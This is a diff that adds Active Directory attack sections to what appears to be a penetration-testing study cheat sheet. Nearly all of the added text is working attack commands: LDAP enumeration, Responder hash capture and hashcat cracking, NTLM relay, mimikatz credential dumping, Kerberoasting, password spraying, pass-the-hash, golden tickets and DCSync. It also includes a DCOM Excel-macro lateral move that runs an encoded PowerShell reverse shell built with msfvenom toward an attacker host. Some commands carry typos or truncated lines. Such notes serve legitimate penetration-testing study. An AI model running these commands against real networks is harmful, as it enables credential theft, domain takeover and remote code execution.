@@ -719,7 +719,10 @@ Internet traffic on port 80 redirection from Kali to Victim
 	ss- antp | grep "8080"
 	```
 
-### Active Directory 
+### Active Directory
+
+**Enumeration**
+
 1. Leveraging net.exe
 	```
 	\# Enumerate local accounts
@@ -788,4 +791,229 @@ Internet traffic on port 80 redirection from Kali to Victim
 	}
 	
 	$Searcher.filter="name=Jeff_Admin"
+	
+	\# Resolving nested groups
+	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+	$PDC = ($domainObj.PdcRoleOwner).Name
+	$SearchString = "LDAP://"
+	$SearchString += $PDC + "/"
+	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+	$SearchString += $DistinguishedName
+	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+	$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+	$Searcher.SearchRoot = $objDomain
+	$Searcher.filter="(objectClass=Group)"
+	$Result = $Searcher.FindAll()
+	Foreach($obj in $Result)
+	{
+		$obj.Properties.name
+	}
+	
+	\# Dislaying Member Attribute
+	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+	$PDC = ($domainObj.PdcRoleOwner).Name
+	$SearchString = "LDAP://"
+	$SearchString += $PDC + "/"
+	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+	$SearchString += $DistinguishedName
+	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+	$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+	$Searcher.SearchRoot = $objDomain
+	$Searcher.filter="(name=Secret_Group)"
+	$Result = $Searcher.FindAll()
+	Foreach($obj in $Result)
+	{
+		$obj.Properties.membe
+	}
+	
+	\# Enumerating Nested Groups with Above Commands
+	$Searcher.SearchRoot = $objDomain
+	$Searcher.filter="(name=Nested_Group)
+	OR
+	$Searcher.SearchRoot = $objDomain
+	$Searcher.filter="(name=Another_Nested_Group)"
+	```
+
+4. Currently Logged on Users
+	```
+	Import-Module .\PowerView.ps1
+	Get-NetLoggedon -ComputerName client251
+	Get-NetSession -ComputerName dc01
+	```
+
+5. Enumeration Through Service Principal Names
+	```
+	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+	$PDC = ($domainObj.PdcRoleOwner).Name
+	$SearchString = "LDAP://"
+	$SearchString += $PDC + "/"
+	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+	$SearchString += $DistinguishedName
+	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+	$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+	$Searcher.SearchRoot = $objDomain
+	$Searcher.filter="serviceprincipalname=*http*"
+	$Result = $Searcher.FindAll()
+	Foreach($obj in $Result)
+	{
+		Foreach($prop in $obj.Properties)
+		{
+			$prop
+		}
+	}
+	
+	nslookup CorpWebServer.corp.com \# service principalname
+	```
+
+**Active Directory Authentication**
+
+1. NTLM Authentication
+	```
+	python Responder.py -l tun0 -rdw \# Capture the hash
+	hashcat -m 5600 ntlm.txt /usr/share/wordlists/rockyou.txt
+	```
+2. SMB Relay
+	```
+	Edit reponder.conf -> SMB = Off, Http = Off
+	python nmtlmrelayx.py -tf targets.txt -smb2support
+	nmap --script=smb2-security-mode.nse -p445 ip.0/24
+	mtlmrelayx.py -tf targets.txt -smb2support
+	Point to attacker machine
+	Connected to machine, forwarded to target, cracked
+	nc ip 11000
+	We are in SMB
+	shares -> sharing files
+	use C$ -> go to full control of whole computer
+	```
+3. Cached Credential Storage and Retrieval
+	```
+	mimikatz.exe
+	privilege::debug
+	sekurlsa::logonpasswords
+	\# Get NTLM and SHA1 -> hashcat on them
+	sekurlsa::tickets
+	\# Look at Ticket Granting Service
+	```
+4. Service Account Attacks
+	```
+	Add-Type -AssemblyName System.IdentityModel
+	New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList
+	'HTTP/CorpWebServer.corp.com'
+	klist
+	kerberos::list /export \# Gets service ticket -> transfer to kali
+	\# On kali
+	sudo apt update && sudo apt install kerberoast
+	python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+	```
+5. Low and Slow Password Guessing
+	```
+	net accounts
+	
+	$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+	$PDC = ($domainObj.PdcRoleOwner).Name
+	$SearchString = "LDAP://"
+	$SearchString += $PDC + "/"
+	$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+	$SearchString += $DistinguishedName
+	New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")
+	\# If successful 
+	distinguishedName : {DC=corp,DC=com}
+	Path : LDAP://DC01.corp.com/DC=corp,DC=com
+	\# Otherwise : The user name or password is incorrect
+	
+	.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
+	```
+
+**Actice Directory Lateral Movement**
+
+1. Pass the hash
+	```
+	\# On kali
+	pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
+	```
+2. Overpass the hash
+	```
+	mimikatz.exe
+	sekurlsa::logonpasswords
+	sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+	klist \# Kerberos tickets
+	net use \\dc01
+	klist
+	\# look at the client and server
+	.\PsExec.exe \\dc01 cmd.exe
+	ipconfig
+	whoami
+	```
+3. Pass the Ticket
+	```
+	whoami /user
+	mimikatz.exe
+	kerberos::purge
+	kerberos::list
+	kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP/rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+	kerberos::list
+	```
+4. Distributed Component Object Model
+	```
+	$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+	$com | Get-Member TypeName: System.__ComObject#{000208d5-0000-0000-c000-000000000046}
+	Sub mymacro()
+		Shell ("notepad.exe")
+	End Sub
+	$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+	$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
+	[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+	$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+	$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+	$temp = [system.io.directory]::createDirectory($Path)
+	
+	$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
+	$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
+	$RemotePath = "\\192.168.1.110\c$\myexcel.xls" [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+	$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+	$temp = [system.io.directory]::createDirectory($Path)
+	$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
+	$com.Run("mymacro")
+	
+	\# On kali
+	msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
+	
+	str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
+	n = 50
+	for i in range(0, len(str), n):
+		print "Str = Str + " + '"' + str[i:i+n] + '"'
+		
+	Sub MyMacro()
+		Dim Str As String
+		Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
+		Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
+		...
+		Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
+		Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
+		Shell (Str)
+	End Sub
+	
+	nc.exe -lvnp 4444
+	```
+	
+**Active Direcotry Persistence**
+
+1. Golden Tickets
+	```
+	psexec.exe \\dc01 cmd.exe
+	mimikatz.exe
+	privilege::debug
+	lsadump::lsa /patch
+	kerberos::purge
+	kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+	misc::cmd
+	psexec.exe \\dc01 cmd.exe
+	ipconfig
+	whoami
+	whoami /groups
+	psexec \\IP cmd.exe
+	```
+2. Domain Controller Synchronization
+	```
+	lsadump::dcsync /user:Administrator
 	```
